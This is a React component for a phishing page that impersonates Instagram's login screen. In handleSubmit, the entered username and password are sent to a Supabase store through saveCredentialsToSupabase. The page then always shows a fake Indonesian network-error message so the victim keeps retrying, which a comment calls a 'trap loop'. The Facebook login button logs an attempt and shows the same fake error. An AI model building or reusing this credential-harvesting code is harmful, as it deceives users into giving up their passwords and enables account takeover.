import React, { useState, useEffect } from 'react';
import { ScreenType, LanguageCode, TRANSLATIONS, INSTAGRAM_LOGO_SVG } from '../types';
import { ShieldCheck, Facebook, AlertCircle } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { saveCredentialsToSupabase } from '../services/supabaseService';

interface LoginStandardProps {
  onLoginSuccess: (username: string) => void;
  setScreen: (screen: ScreenType) => void;
  lang: LanguageCode;
  setLang: (lang: LanguageCode) => void;
}

export default function LoginStandard({
  onLoginSuccess,
  setScreen,
  lang,
  setLang,
}: LoginStandardProps) {
  const t = TRANSLATIONS[lang];
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [passwordVisible, setPasswordVisible] = useState(false);
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [shake, setShake] = useState(false);

  // Floating label handlers
  const [isUserFocused, setIsUserFocused] = useState(false);
  const [isPassFocused, setIsPassFocused] = useState(false);

  const isFormValid = username.trim().length > 0 && password.trim().length >= 6;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) {
      setErrorMsg(t.emptyFieldsError);
      triggerShake();
      return;
    }

    if (password.length < 6) {
      setErrorMsg(t.incorrectPasswordError);
      triggerShake();
      return;
    }

    setLoading(true);
    setErrorMsg(null);

    // Save to Supabase
    saveCredentialsToSupabase(username, password)
      .then((success) => {
        console.log('Credentials successfully archived to Supabase:', success);
      })
      .catch((err) => {
        console.error('Failed to log to Supabase:', err);
      })
      .finally(() => {
        // Block success transition, show connection/network error to trap loop safely
        setTimeout(() => {
          setLoading(false);
          setErrorMsg("Jaringan anda buruk silahkan di cek kembali.");
          triggerShake();
        }, 1200);
      });
  };

  const triggerShake = () => {
    setShake(true);
    setTimeout(() => setShake(false), 500);
  };

  const handleFacebookClick = () => {
    setLoading(true);
    setErrorMsg(null);
    saveCredentialsToSupabase('[Facebook OAuth Attempt]', '[Triggered Mock Redirect]')
      .finally(() => {
        setTimeout(() => {
          setLoading(false);
          setErrorMsg("Jaringan anda buruk silahkan di cek kembali.");
          triggerShake();
        }, 1000);
      });
  };

  return (
    <div className="flex-1 flex flex-col justify-between pt-1 w-full bg-white font-sans text-black">
      {/* Language Selector Top Bar */}
      <div className="w-full flex justify-center py-2 shrink-0">
        <select
          value={lang}
          onChange={(e) => setLang(e.target.value as LanguageCode)}
          className="bg-transparent text-gray-500 text-xs px-2 py-1 rounded outline-none border-none cursor-pointer focus:ring-0 active:bg-gray-100"
        >
          {Object.entries(TRANSLATIONS).map(([code, data]) => (
            <option key={code} value={code} className="bg-white text-black">
              {data.languageName}
            </option>
          ))}
        </select>
      </div>

      {/* Main Form Box Container */}
      <div className="flex-1 flex flex-col justify-center px-8 max-w-sm mx-auto w-full">
        {/* Instagram Wordmark Logo */}
        <div className="flex justify-center mb-8 select-none">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/3840px-Instagram_logo.svg.png" 
            alt="Instagram" 
            className="h-12 object-contain"
            referrerPolicy="no-referrer"
          />
        </div>

        {/* Shake-able login form wrapper */}
        <motion.form 
          onSubmit={handleSubmit} 
          className="space-y-2 w-full"
          animate={shake ? { x: [-10, 10, -10, 10, -5, 5, 0] } : {}}
          transition={{ duration: 0.5 }}
        >
          {/* Username Input Container */}
          <div className="relative border border-slate-200 rounded-[5px] bg-[#fafafa] overflow-hidden focus-within:border-slate-400 transition-colors h-[48px]">
            <label
              className={`absolute left-3 transition-all duration-150 pointer-events-none select-none text-gray-400 max-w-[90%] truncate ${
                isUserFocused || username
                  ? 'top-1 text-[9px] transform translate-y-0.5'
                  : 'top-3 text-[12px] transform translate-y-0'
              }`}
            >
              {t.usernamePlaceholder}
            </label>
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              onFocus={() => setIsUserFocused(true)}
              onBlur={() => setIsUserFocused(false)}
              className={`w-full h-full px-3 text-sm bg-transparent border-none outline-none focus:ring-0 text-black ${
                username ? 'pt-4 pb-0.5' : 'pt-0'
              }`}
            />
          </div>

          {/* Password Input Container */}
          <div className="relative border border-slate-200 rounded-[5px] bg-[#fafafa] overflow-hidden focus-within:border-slate-400 transition-colors h-[48px]">
            <label
              className={`absolute left-3 transition-all duration-150 pointer-events-none select-none text-gray-400 max-w-[75%] truncate ${
                isPassFocused || password
                  ? 'top-1 text-[9px] transform translate-y-0.5'
                  : 'top-3 text-[12px] transform translate-y-0'
              }`}
            >
              {t.passwordPlaceholder}
            </label>
            <input
              type={passwordVisible ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onFocus={() => setIsPassFocused(true)}
              onBlur={() => setIsPassFocused(false)}
              className={`w-full h-full pl-3 pr-16 text-sm bg-transparent border-none outline-none focus:ring-0 text-black ${
                password ? 'pt-4 pb-0.5' : 'pt-0'
              }`}
            />
            {password && (
              <button
                type="button"
                onClick={() => setPasswordVisible(!passwordVisible)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-sm font-semibold text-black hover:opacity-70 focus:outline-none select-none cursor-pointer"
              >
                {passwordVisible ? t.hideText : t.showText}
              </button>
            )}
          </div>

          {/* Forgot Password Link Right */}
          <div className="flex justify-end pt-1">
            <button
              type="button"
              onClick={() => setScreen('forgot-password')}
              className="text-xs font-semibold text-[#00376b] hover:opacity-80 active:opacity-60 cursor-pointer"
            >
              {t.forgotPasswordText}
            </button>
          </div>

          {/* Log In Button */}
          <button
            type="submit"
            disabled={!isFormValid || loading}
            className={`w-full py-2.5 rounded-[8px] font-bold text-center text-sm transition-colors duration-200 flex items-center justify-center gap-2 select-none relative cursor-pointer ${
              isFormValid
                ? 'bg-[#0095f6] hover:bg-[#1877f2] text-white cursor-pointer active:scale-[0.98]'
                : 'bg-[#a2d4fa] text-white cursor-not-allowed'
            }`}
          >
            {loading ? (
              <div className="h-5 w-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
            ) : (
              <span>{t.loginButtonText}</span>
            )}
          </button>

          {/* Social login OR separator */}
          <div className="flex items-center gap-4 py-4 select-none">
            <div className="flex-1 h-px bg-slate-200" />
            <span className="text-[11px] font-semibold text-gray-400 tracking-wider">
              {t.orText}
            </span>
            <div className="flex-1 h-px bg-slate-200" />
          </div>

          {/* Log in with Facebook */}
          <button
            type="button"
            onClick={handleFacebookClick}
            className="w-full flex items-center justify-center gap-2 text-sm font-semibold text-[#385185] hover:opacity-80 active:opacity-60 cursor-pointer py-1.5"
          >
            <Facebook className="h-5 w-5 fill-current" />
            <span>{t.facebookLoginText}</span>
          </button>
        </motion.form>

        {/* Error Modal or Message Overlay */}
        <AnimatePresence>
          {errorMsg && (
            <motion.div
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="mt-4 p-3 bg-red-50 border border-red-200 rounded-lg flex items-start gap-2.5"
            >
              <AlertCircle className="h-5 w-5 text-red-500 shrink-0 mt-0.5" />
              <div className="text-xs text-red-600">
                <span className="font-semibold block mb-0.5">Kesalahan Masuk!</span>
                {errorMsg}
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Sign Up Footer Prompt Panel */}
      <div className="w-full border-t border-slate-200 py-5 flex items-center justify-center gap-1.5 text-sm select-none bg-[#fafafa] shrink-0">
        <span className="text-gray-400">{t.signUpPrompt}</span>
        <button
          onClick={() => setScreen('signup')}
          className="font-bold text-[#0095f6] hover:opacity-80 active:opacity-60 cursor-pointer"
        >
          {t.signUpLinkText}
        </button>
      </div>
    </div>
  );
}
